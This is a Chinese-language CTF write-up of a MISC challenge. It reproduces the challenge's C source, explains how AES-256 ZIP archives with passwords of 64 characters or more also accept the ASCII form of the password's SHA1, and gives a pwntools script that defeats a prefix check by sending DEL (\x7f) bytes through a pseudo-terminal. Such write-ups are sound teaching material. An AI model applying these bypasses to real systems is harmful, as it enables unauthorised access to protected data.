---
title: ZIP多密码解包_DEL绕过
id: 65ffe06c-d6d8-4816-9408-313a47e3e972
date: 2024-05-07 21:50:39
auther: yrl
cover: 
excerpt: zip -> \x7f_del 某高校安全运维赛的一道题目，属于MISC范围 题目描述 Alice 把 flag 用你的 token 压缩并加密成了一个 zip 压缩包，并且希望你提供 flag 来解压这个压缩包。如果解压成功， Alice 就会告诉你 flag 的内容，但好像 Alice 的代码实
permalink: /archives/zip_del_bypass
categories:
 - others-wp
tags: 
 - zip
---

# zip -> \x7f_del

某高校安全运维赛的一道题目，属于MISC范围

## 题目描述

    Alice 把 flag 用你的 token 压缩并加密成了一个 zip 压缩包，并且希望你提供 flag 来解压这个压缩包。如果解压成功， Alice 就会告诉你 flag 的内容，但好像 Alice 的代码实现有些问题？

## 附件  
题目附件是题目源码：
```c
#include <arpa/inet.h>
#include <sys/wait.h>
#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <pty.h>

char token[1024], buf[1024];

void load() {
    FILE *f = fopen("token.txt", "r");
    fgets(token, sizeof(token), f);
    token[64] = 0; // maybe 64 bytes is enough
    fclose(f);
}

int cmpstr(char const *a, char const *b) {
    return memcmp(a, b, strlen(a));
}

void zip(char *password) {
    int master, pid;
    pid = forkpty(&master, NULL, NULL, NULL);

    if (pid == 0) {
        char* argv[] = { "7z", "a", "flag.zip", "tmp/flag.txt", "-mem=AES256", "-p", NULL };
        execve("/usr/bin/7z", argv, NULL);
    } else {
        char buffer[4097];
        while (true) {
            ssize_t n = read(master, buffer, 4096);
            if (n < 0) break;
            fflush(stdout);
            write(1, buffer, n);

            buffer[n] = 0;
            if (strstr(buffer, "password")) {
                usleep(10000);
                write(master, password, strlen(password));
                write(master, "\n", 1);
            }
        }
        wait(NULL);
    }
    close(master);
}

void unzip(char *password) {
    int master, pid;
    pid = forkpty(&master, NULL, NULL, NULL);

    if (pid == 0) {
        char* argv[] = { "7z", "e", "flag.zip", NULL };
        execve("/usr/bin/7z", argv, NULL);
    } else {
        char buffer[4097];
        while (true) {
            ssize_t n = read(master, buffer, 4096);
            if (n < 0) break;
            fflush(stdout);
            write(1, buffer, n);

            buffer[n] = 0;
            if (strstr(buffer, "rename all")) {
                usleep(10000);
                write(master, "u\n", 2);
            }

            if (strstr(buffer, "Enter password")) {
                usleep(10000);
                write(master, password, strlen(password));
                write(master, "\n", 1);
            }
        }
        wait(NULL);
    }
    close(master);
}

int main(int argc, char *argv[]) {
    load();
    system("7z");

    puts("your token:");
    fflush(stdout);
    fgets(buf, sizeof(buf), stdin);
    if (cmpstr(token, buf)) {
        puts("wrong token!");
        return 1;
    }

    zip(buf);

    puts("your flag:");
    fflush(stdout);

    fgets(buf, sizeof(buf), stdin);
    if (cmpstr("flag{", buf)) {
        puts("wrong flag!");
        return 1;
    }

    unzip(buf);

    FILE *f = fopen("flag.txt", "r");
    if (!f) {
        puts("flag.txt not found");
        return 1;
    }
    fgets(buf, sizeof(buf), f);
    fclose(f);

    printf("flag: %s\n", buf);

    return 0;
}

```
编译命令：`gcc zip.c -o zip -g -lutil`

## 题目分析

代码流程是将tmp/flag.txt压缩为flag.zip，压缩和解压都是通过执行shell命令完成的，主进程执行shell命令，fork的子进程对压缩过程进行交互，包括输入密码等操作

通读下来代码逻辑为：
1. 将环境中token的前64字节作为第一个检查点并作为压缩flag.txt的密码，压缩为flag.zip
2. 输入以`flag{`开头的buf，并作为密码对flag.zip进行解压缩，最后输出解压后的flag.txt的内容

值得注意的是zip功能的密码是64Byte长度的，属于超长密码，并且使用的是AES256加密算法，此种情况可能会出现多个密码同时解开zip包的情况，原因是因为当采用AES256对zip进行加密时，密码超长（大于等于64Byte）压缩程序会将超长密码的sha1的ASCII码作为密码对zip包进行加密。

此时就会存在超长密码可以解开zip包，超长密码的sha1的ASCII码值也可以解开zip包

如：
一个超过 64 位的长密码：
```
Nev1r-G0nna-G2ve-Y8u-Up-N5v1r-G1nna-Let-Y4u-D1wn-N8v4r-G5nna-D0sert-You
```

当使用这个密码解压缩文件时，Zip 应用程序就会计算它的 SHA1 哈希值。
```
706b4838613041714e62486364773847726d5370
```

最后将这个 SHA1 哈希值由每两位为一个单位的 16 进制数值“翻译”成 ASCII 码，就产生了另一个明文密码

比如，70 的 ACSII 码对应的字符就是小写的字母 p ，6b 就是小写的字母 k ，以此类推:

```
pkH8a0AqNbHcdw8GrmSp
```

造成这种特殊情况需要几个前提条件:

1. 用户输入的密码必须大于等于 64 位，应用程序才会启动计算并产生 SHA1 哈希值。
2. 加密算法必须要使用 AES-256 。
3. 产生的 SHA1 哈希值必须可以转换成可显的 ASCII 码，不可显的 ASCII 码（看上去像问号的乱码）并没有意义

再回到题目判断后发现改题目不符合以上第三个条件，所以不可行

所以回到题目源码中再次看，如何绕过两个cmpstr判断，还要保证加密解密字符一样、密码还得是flag{开头，似乎不太可行

我们再看下代码，发现cmpstr实现是通过memcpy对比，且对比长度是第一个参数的长度由strlen实现，具有0阶截断，长度以外的不做检测，以下有两个思路绕过cmpstr

1. 绕过第一个比较token的cmpstr，利用0截断特性将token开头改为0，此时可以让对比长度为0来绕过，加入buf有一字节溢出就可以将buf下方的token首字节写为0，但是fgets阻止了这种情况，故不可行。但此种方式不失为一种出题思路

2. 绕过第二个比较flag{的cmpstr，再次查看zip、unzip发现是通过fork子进程执行shell命令和shell做交互的，那么当我输入flag{后再将其删除，再次如正确的压缩密码即可绕过检测，模拟了树密码时输错后删除的操作，在终端中127(\x7f)代表del删除键

如上第二种思路，我们构造payload如下：
```python
b'flag{\x7f\x7f\x7f\x7f\x7f297:MEQCIBP0rpfmVGWdLWFs864tq1x9rxiW7MZ9toA_7G1iGiZXAiBdKQ6zs0EP'
```

## exp

```python
from pwn import *
context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
conn = process('./zip_tst')
# gdb.attach(conn)
# pause()
conn.sendlineafter(b'token',b'297:MEQCIBP0rpfmVGWdLWFs864tq1x9rxiW7MZ9toA_7G1iGiZXAiBdKQ6zs0EP')
pause()
conn.sendlineafter(b'flag',b'flag{\x7f\x7f\x7f\x7f\x7f297:MEQCIBP0rpfmVGWdLWFs864tq1x9rxiW7MZ9toA_7G1iGiZXAiBdKQ6zs0EP')

conn.interactive()
```

